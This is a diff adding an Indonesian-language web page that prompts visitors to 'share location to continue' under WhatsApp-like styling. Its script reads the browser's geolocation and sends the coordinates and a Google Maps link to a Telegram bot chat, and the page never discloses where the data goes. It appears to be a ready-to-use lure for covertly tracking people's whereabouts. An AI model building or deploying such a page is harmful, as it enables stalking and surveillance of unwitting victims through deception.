@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bagikan Lokasi</title>
+
+<style>
+body{
+font-family:Arial,sans-serif;
+background:#f5f5f5;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+margin:0;
+}
+
+.box{
+background:white;
+padding:30px;
+border-radius:15px;
+box-shadow:0 0 15px rgba(0,0,0,.1);
+width:350px;
+text-align:center;
+}
+
+button{
+background:#25D366;
+color:white;
+border:none;
+padding:15px 25px;
+border-radius:10px;
+font-size:16px;
+cursor:pointer;
+}
+
+#status{
+margin-top:15px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="box">
+
+<h2>📍 Bagikan Lokasi</h2>
+
+<p>
+Silakan bagikan lokasi Anda untuk melanjutkan.
+</p>
+
+<button onclick="sendLocation()">
+Bagikan Lokasi
+</button>
+
+<div id="status"></div>
+
+</div>
+
+<script>
+
+const BOT_TOKEN = "TOKEN_KAMU";
+const CHAT_ID = "5486357110";
+
+async function sendLocation(){
+
+document.getElementById("status").innerHTML =
+"Mengambil lokasi...";
+
+navigator.geolocation.getCurrentPosition(
+
+async function(position){
+
+let lat = position.coords.latitude;
+let lng = position.coords.longitude;
+
+let maps =
+`https://maps.google.com/?q=${lat},${lng}`;
+
+let text =
+`📍 Lokasi Baru
+
+Latitude : ${lat}
+Longitude : ${lng}
+
+${maps}`;
+
+await fetch(
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:text
+})
+}
+);
+
+document.getElementById("status").innerHTML =
+"✅ Lokasi berhasil dikirim.";
+
+},
+
+function(){
+
+document.getElementById("status").innerHTML =
+"❌ Izin lokasi ditolak.";
+
+}
+
+);
+
+}
+
+</script>
+
+</body>
+</html>
